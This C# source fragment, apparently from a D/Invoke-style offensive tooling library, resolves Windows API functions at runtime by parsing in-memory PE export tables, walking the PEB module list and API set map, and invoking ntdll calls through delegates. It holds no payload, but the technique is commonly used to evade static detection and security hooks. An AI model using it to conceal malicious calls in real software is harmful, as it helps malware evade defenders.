		public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
		{
			Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
			return funcDelegate.DynamicInvoke(Parameters);
		}
		
		public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
		{
			IntPtr hModule = GetLoadedModuleAddress(DLLName);
			if (hModule == IntPtr.Zero)
			{
				throw new DllNotFoundException(DLLName + ", Dll was not found.");
			}
			return GetExportAddress(hModule, FunctionName, ResolveForwards);
		}
		
		public static IntPtr GetLoadedModuleAddress(string DLLName)
		{
			ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
			foreach(ProcessModule Mod in ProcModules)
			{
				if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
				{
					return Mod.BaseAddress;
				}
			}
			return IntPtr.Zero;
		}
		
		public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
		{
			IntPtr FunctionPtr = IntPtr.Zero;
			try
			{
				// Traverse the PE header in memory
				Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
				Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
				Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
				Int16 Magic = Marshal.ReadInt16((IntPtr) OptHeader);
				Int64 pExport = 0;
				if (Magic == 0x010b)
				{
					pExport = OptHeader + 0x60;
				}
				else
				{
					pExport = OptHeader + 0x70;
				}

				// Read -> IMAGE_EXPORT_DIRECTORY
				Int32 ExportRVA = Marshal.ReadInt32((IntPtr) pExport);
				Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
				Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
				Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
				Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
				Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
				Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

				// Get the VAs of the name table's beginning and end.
				Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
				Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

				// Loop the array of export name RVA's
				for (int i = 0; i < NumberOfNames; i++)
				{
					string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
					if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
					{
						Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
						Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
						FunctionPtr = (IntPtr)((Int64) ModuleBase + FunctionRVA);

						if (ResolveForwards == true)
							// If the export address points to a forward, get the address
							FunctionPtr = GetForwardAddress(FunctionPtr);
						break;
					}
				}
			}
			catch
			{
				// Catch parser failure
				throw new InvalidOperationException("Failed to parse module exports.");
			}

			if (FunctionPtr == IntPtr.Zero)
			{
				// Export not found
				throw new MissingMethodException(ExportName + ", export not found.");
			}
			return FunctionPtr;
		}
		public static IntPtr GetForwardAddress(IntPtr ExportAddress)
		{
			IntPtr FunctionPtr = ExportAddress;
			try
			{
				// Assume it is a forward. If it is not, we will get an error
				string ForwardNames = Marshal.PtrToStringAnsi(FunctionPtr);
				string[] values = ForwardNames.Split('.');

				string ForwardModuleName = values[0];
				string ForwardExportName = values[1];

				// Check if it is an API Set mapping
				Dictionary < string, string > ApiSet = GetApiSetMapping();
				string LookupKey = ForwardModuleName.Substring(0, ForwardModuleName.Length - 2) + ".dll";
				if (ApiSet.ContainsKey(LookupKey))
					ForwardModuleName = ApiSet[LookupKey];
				else
					ForwardModuleName = ForwardModuleName + ".dll";

				IntPtr hModule = GetPebLdrModuleEntry(ForwardModuleName);
				if (hModule != IntPtr.Zero)
				{
					FunctionPtr = GetExportAddress(hModule, ForwardExportName);
				}
			}
			catch
			{
				// Do nothing, it was not a forward
			}
			return FunctionPtr;
		}
		public static STRUCTS.PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr hProcess)
		{
			STRUCTS.NTSTATUS retValue = NtQueryInformationProcess(hProcess, STRUCTS.PROCESSINFOCLASS.ProcessBasicInformation, out IntPtr pProcInfo);
			if (retValue != STRUCTS.NTSTATUS.Success)
			{
				throw new UnauthorizedAccessException("Access is denied.");
			}

			return (STRUCTS.PROCESS_BASIC_INFORMATION) Marshal.PtrToStructure(pProcInfo, typeof(STRUCTS.PROCESS_BASIC_INFORMATION));
		}
		public static IntPtr GetPebLdrModuleEntry(string DLLName)
		{
			// Get _PEB pointer
			STRUCTS.PROCESS_BASIC_INFORMATION pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));

			// Set function variables
			UInt32 LdrDataOffset = 0;
			UInt32 InLoadOrderModuleListOffset = 0;
			if (IntPtr.Size == 4)
			{

				LdrDataOffset = 0xc;
				InLoadOrderModuleListOffset = 0xC;
			}
			else
			{
				LdrDataOffset = 0x18;
				InLoadOrderModuleListOffset = 0x10;
			}

			// Get module InLoadOrderModuleList -> _LIST_ENTRY
			IntPtr PEB_LDR_DATA = Marshal.ReadIntPtr((IntPtr)((UInt64) pbi.PebBaseAddress + LdrDataOffset));
			IntPtr pInLoadOrderModuleList = (IntPtr)((UInt64) PEB_LDR_DATA + InLoadOrderModuleListOffset);
			STRUCTS.LIST_ENTRY le = (STRUCTS.LIST_ENTRY) Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(STRUCTS.LIST_ENTRY));

			// Loop entries
			IntPtr flink = le.Flink;
			IntPtr hModule = IntPtr.Zero;
			STRUCTS.LDR_DATA_TABLE_ENTRY dte = (STRUCTS.LDR_DATA_TABLE_ENTRY) Marshal.PtrToStructure(flink, typeof(STRUCTS.LDR_DATA_TABLE_ENTRY));
			while (dte.InLoadOrderLinks.Flink != le.Blink)
			{
				// Match module name
				if (Marshal.PtrToStringUni(dte.FullDllName.Buffer).EndsWith(DLLName, StringComparison.OrdinalIgnoreCase))
				{
					hModule = dte.DllBase;
				}

				// Move Ptr
				flink = dte.InLoadOrderLinks.Flink;
				dte = (STRUCTS.LDR_DATA_TABLE_ENTRY) Marshal.PtrToStructure(flink, typeof(STRUCTS.LDR_DATA_TABLE_ENTRY));
			}

			return hModule;
		}
		public static Dictionary < string, string > GetApiSetMapping()
		{
			STRUCTS.PROCESS_BASIC_INFORMATION pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));
			UInt32 ApiSetMapOffset = IntPtr.Size == 4 ? (UInt32) 0x38 : 0x68;
			// Create mapping dictionary
			Dictionary < string, string > ApiSetDict = new Dictionary < string, string > ();
			IntPtr pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((UInt64) pbi.PebBaseAddress + ApiSetMapOffset));
			STRUCTS.ApiSetNamespace Namespace = (STRUCTS.ApiSetNamespace) Marshal.PtrToStructure(pApiSetNamespace, typeof(STRUCTS.ApiSetNamespace));
			for (var i = 0; i < Namespace.Count; i++)
			{
				STRUCTS.ApiSetNamespaceEntry SetEntry = new STRUCTS.ApiSetNamespaceEntry();
				IntPtr pSetEntry = (IntPtr)((UInt64) pApiSetNamespace + (UInt64) Namespace.EntryOffset + (UInt64)(i * Marshal.SizeOf(SetEntry)));
				SetEntry = (STRUCTS.ApiSetNamespaceEntry) Marshal.PtrToStructure(pSetEntry, typeof(STRUCTS.ApiSetNamespaceEntry));
				string ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((UInt64) pApiSetNamespace + (UInt64) SetEntry.NameOffset), SetEntry.NameLength / 2);
				string ApiSetEntryKey = ApiSetEntryName.Substring(0, ApiSetEntryName.Length - 2) + ".dll"; // Remove the patch number and add .dll

				STRUCTS.ApiSetValueEntry SetValue = new STRUCTS.ApiSetValueEntry();
				IntPtr pSetValue = IntPtr.Zero;

				if (SetEntry.ValueLength == 1)
					pSetValue = (IntPtr)((UInt64) pApiSetNamespace + (UInt64) SetEntry.ValueOffset);
				else if (SetEntry.ValueLength > 1)
				{
					// Loop through the hosts until we find one that is different from the key, if available
					for (var j = 0; j < SetEntry.ValueLength; j++)
					{
						IntPtr host = (IntPtr)((UInt64) pApiSetNamespace + (UInt64) SetEntry.ValueOffset + (UInt64) Marshal.SizeOf(SetValue) * (UInt64) j);
						if (Marshal.PtrToStringUni(host) != ApiSetEntryName)
							pSetValue = (IntPtr)((UInt64) pApiSetNamespace + (UInt64) SetEntry.ValueOffset + (UInt64) Marshal.SizeOf(SetValue) * (UInt64) j);
					}
					// If there is not one different from the key, then just use the key and hope that works
					if (pSetValue == IntPtr.Zero)
						pSetValue = (IntPtr)((UInt64) pApiSetNamespace + (UInt64) SetEntry.ValueOffset);
				}

				SetValue = (STRUCTS.ApiSetValueEntry) Marshal.PtrToStructure(pSetValue, typeof(STRUCTS.ApiSetValueEntry));
				string ApiSetValue = string.Empty;
				if (ApiSetEntryName.Contains("processthreads"))
				{
					IntPtr pValue = (IntPtr)((UInt64) pApiSetNamespace + (UInt64) SetValue.ValueOffset);
				}
				if (SetValue.ValueCount != 0)
				{
					IntPtr pValue = (IntPtr)((UInt64) pApiSetNamespace + (UInt64) SetValue.ValueOffset);
					ApiSetValue = Marshal.PtrToStringUni(pValue, SetValue.ValueCount / 2);
				}
				ApiSetDict.Add(ApiSetEntryKey, ApiSetValue);
			}
			// Return dict
			return ApiSetDict;
		}
		public static STRUCTS.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, STRUCTS.PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
		{
			int processInformationLength;
			UInt32 RetLen = 0;

			switch (processInfoClass)
			{
				case STRUCTS.PROCESSINFOCLASS.ProcessWow64Information:
					pProcInfo = Marshal.AllocHGlobal(IntPtr.Size);
					RtlZeroMemory(pProcInfo, IntPtr.Size);
					processInformationLength = IntPtr.Size;
					break;
				case STRUCTS.PROCESSINFOCLASS.ProcessBasicInformation:
					STRUCTS.PROCESS_BASIC_INFORMATION PBI = new STRUCTS.PROCESS_BASIC_INFORMATION();
					pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(PBI));
					RtlZeroMemory(pProcInfo, Marshal.SizeOf(PBI));
					Marshal.StructureToPtr(PBI, pProcInfo, true);
					processInformationLength = Marshal.SizeOf(PBI);
					break;
				default:
					throw new InvalidOperationException($"Invalid ProcessInfoClass: {processInfoClass}");
			}
			object[] funcargs = {
				hProcess,
				processInfoClass,
				pProcInfo,
				processInformationLength,
				RetLen
			};

			STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS) DynamicAPIInvoke(@"ntdll.dll", @"NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);
			if (retValue != STRUCTS.NTSTATUS.Success)
			{
				throw new UnauthorizedAccessException("Access is denied.");
			}

			// Update the modified variables
			pProcInfo = (IntPtr) funcargs[2];
			return retValue;
		}
		public static void RtlZeroMemory(IntPtr Destination, int Length)
		{
			// Craft an array for the arguments
			object[] funcargs = {
				Destination,
				Length
			};
			DynamicAPIInvoke(@"ntdll.dll", @"RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
		}
	}
}
